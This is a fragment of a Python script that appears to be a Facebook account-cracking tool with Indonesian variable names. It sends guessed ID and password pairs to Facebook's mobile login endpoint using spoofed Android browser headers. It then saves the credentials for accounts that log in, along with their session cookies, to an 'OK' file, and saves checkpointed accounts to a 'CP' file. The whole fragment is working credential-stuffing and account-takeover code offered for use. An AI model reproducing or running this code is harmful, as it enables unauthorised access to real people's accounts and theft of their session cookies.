                'referer': f'https://m.facebook.com/login.php?skip_api_login=1&api_key=1542246699308023&kid_directed_site=0&app_id=1542246699308023&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D1542246699308023%26cbt%3D1711326940492%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33345f7445b7dfb7%2526domain%253Dvoila.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fvoila.id%25252Ff3a957c03c33f9a9d%2526relation%253Dopener%26client_id%3D1542246699308023%26display%3Dtouch%26domain%3Dvoila.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fvoila.id%252Faccount%252Flogin%26locale%3Den_US%26logger_id%3Df927d4a630f80cea8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9ceae5e3f1fb68f5%2526domain%253Dvoila.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fvoila.id%25252Ff3a957c03c33f9a9d%2526relation%253Dopener%2526frame%253Df9b653a32ccf0bc57%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df9ceae5e3f1fb68f5%26domain%3Dvoila.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fvoila.id%252Ff3a957c03c33f9a9d%26relation%3Dopener%26frame%3Df9b653a32ccf0bc57%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"Infinix X6816"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"11.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': ua,
                'x-asbd-id': '129477',
                'x-fb-lsd': 'AVrg9fckn1o',
            }
			po = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID''",data=wibu_data,headers=wibu_head,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"               ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				cetak(tree) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree= Tree(f"               ")
				tree.add(f"[bold green]{idf}|{pw}|{kuki}").add(f"[blue]{ua}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
# sistem kontrol
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()